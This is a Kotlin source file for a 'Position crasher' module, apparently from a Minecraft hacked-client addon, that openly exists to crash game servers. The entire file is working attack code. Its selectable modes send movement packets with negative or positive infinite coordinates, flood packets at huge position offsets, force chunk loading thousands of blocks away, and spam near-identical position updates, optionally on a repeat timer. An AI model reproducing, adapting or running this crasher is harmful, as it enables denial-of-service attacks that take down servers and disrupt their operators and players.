package de.florianmichael.tarasande_crasher.module

import de.florianmichael.tarasande_crasher.forcePacket
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket
import net.tarasandedevelopment.tarasande.event.EventDisconnect
import net.tarasandedevelopment.tarasande.event.EventUpdate
import net.tarasandedevelopment.tarasande.mc
import net.tarasandedevelopment.tarasande.system.base.valuesystem.impl.ValueBoolean
import net.tarasandedevelopment.tarasande.system.base.valuesystem.impl.ValueMode
import net.tarasandedevelopment.tarasande.system.base.valuesystem.impl.ValueNumber
import net.tarasandedevelopment.tarasande.system.feature.modulesystem.Module
import net.tarasandedevelopment.tarasande.util.math.TimeUtil

class ModulePositionCrasher : Module("Position crasher", "Crashes the server using invalid positions", "Crasher") {

    private val mode = ValueMode(this, "Mode", false, "Negative infinity", "Positive infinity", "Random offsets", "Force chunk loading", "Minimalistic offset")

    private val repeat = ValueBoolean(this, "Repeat", false)
    private val repeatDelay = ValueNumber(this, "Repeat delay", 5.0, 50.0, 100.0, 5.0, isEnabled = { repeat.value })

    private val offsetBase = ValueNumber(this, "Offset base", 0.0, 1000.0, 5000.0, 1.0, isEnabled = { mode.isSelected(2) || mode.isSelected(4) })
    private val offset = ValueNumber(this, "Offset", 0.0, 1000.0, 5000.0, 1.0, isEnabled = { mode.isSelected(2) })
    private val loadingReach = ValueNumber(this, "Loading reach", 0.0, 6685.0, 10000.0, 100.0, isEnabled = { mode.isSelected(3) })

    private val timer = TimeUtil()

    init {
        registerEvent(EventDisconnect::class.java) {
            switchState()
        }
        registerEvent(EventUpdate::class.java) {
            if (repeat.value) {
                if (timer.hasReached(repeatDelay.value.toLong())) {
                    execute()
                    timer.reset()
                }
            }
        }
    }

    override fun onEnable() {
        if (!repeat.value) execute()
    }

    private fun execute() {
        if (mode.isSelected(0) || mode.isSelected(1)) {
            val infinity = if (mode.isSelected(0)) Double.NEGATIVE_INFINITY else if (mode.isSelected(1)) Double.POSITIVE_INFINITY else 0.0
            forcePacket(PlayerMoveC2SPacket.PositionAndOnGround(infinity, infinity, infinity, true))
            return
        }
        if (mode.isSelected(2)) {
            var index = 0
            while (index < offset.value.toLong()) {
                forcePacket(PlayerMoveC2SPacket.PositionAndOnGround(
                    mc.player!!.x + offsetBase.value * index,
                    mc.player!!.y + offsetBase.value * index,
                    mc.player!!.z + offsetBase.value * index,
                    true
                ))
                ++index
            }
            return
        }
        if (mode.isSelected(3)) {
            var base = mc.player!!.y
            while (base < 255) {
                forcePacket(PlayerMoveC2SPacket.PositionAndOnGround(mc.player!!.x, base, mc.player!!.z, false))
                base += 5.0
            }

            var index = 0
            while (index < loadingReach.value.toLong()) {
                forcePacket(PlayerMoveC2SPacket.PositionAndOnGround(mc.player!!.x + index, 255.0, mc.player!!.z + index, false))
                index += 5
            }
            return
        }
        if (mode.isSelected(4)) {
            var index = 0
            while (index < offset.value.toLong()) {
                forcePacket(PlayerMoveC2SPacket.PositionAndOnGround(mc.player!!.x, mc.player!!.y + 0.09999999999999, mc.player!!.z, false))
                forcePacket(PlayerMoveC2SPacket.PositionAndOnGround(mc.player!!.x, mc.player!!.y, mc.player!!.z, false))
                index++
            }
            return
        }
    }
}
